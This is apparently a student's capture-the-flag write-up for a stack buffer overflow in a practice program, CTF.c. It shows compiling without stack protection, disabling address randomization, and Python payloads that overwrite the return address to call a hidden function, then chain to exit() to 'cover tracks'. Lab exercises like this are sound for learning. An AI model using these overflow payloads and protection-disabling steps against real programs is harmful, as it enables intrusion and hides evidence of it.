# Understand CTF.c 
For a 32-bit virtual machine:
- A pointer needs to store a 32-bit address, which requires 4 bytes.
Exploitation Plan:
- Overwrite buf to execute myfunc
- Difficult due to multiple traps that cause the program to return before obtaining the flag.
- When called fraudulently, the two arguments q and p are not on the stack.
- Determine the locations of the arguments to inject the values properly.
## Under stand how Stackframe in this context
- Starting stackframe
  ![image](https://github.com/user-attachments/assets/899f86d8-975b-4d4b-a4c3-8b579eddda8a)
- Myfunc's stackframe
  ![image](https://github.com/user-attachments/assets/380de9c3-0350-4c03-986e-4bbbaee12d81)
- When buffer-overflow happens, it will look like this
  ![image](https://github.com/user-attachments/assets/b2700e22-b4c8-49a1-9fb2-9263c2882989)  
=> Therefore, the ebp (base pointer) of the main() function must hold the value of p, and the return address (ret addr) of main() must contain the value of q.
## Vulnerbility
The vulnerability is in strcpy(buf, s) at line 31. 
# Start attacking CTF.c
## compile CTF.c with gcc
`gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2`
![image](https://github.com/user-attachments/assets/50491f3d-8784-4682-baca-162db99bc07f)
## Adjust the system settings to disable address randomization
`sudo sysctl -w kernel.randomize_va_space=0`  
![image](https://github.com/user-attachments/assets/3fde9551-4ee7-41e4-a52c-cb159002d517)
## Run python file with p and q has the address the same with the given myfunc
`./ctf.out $(python -c "print(104*'a' + '\x1b\x85\x04\x08' + 4*'a' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`  
![image](https://github.com/user-attachments/assets/2eda6c14-d30b-4bce-a980-5942244b490d)
## Covering track (leaving no footsteps) by giving return address with exit's address
- Load the ctf to gdb by `gdb -q ctf` and `info func` to see all function including exit
  ![image](https://github.com/user-attachments/assets/fcf63f98-124e-4143-9eb5-b5a8a272dc1c)
- Now remove the **(4 * 'a')** with the exit's address and see the result (remember to type `q` in gdb to exit)
  `./ctf.out $(python -c "print(104*'a' + '\x1b\x85\x04\x08' + '\xe0\x83\x04\x08' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`
  ![image](https://github.com/user-attachments/assets/994630e4-aee9-4536-96a0-c3e2d5cbeaf1)
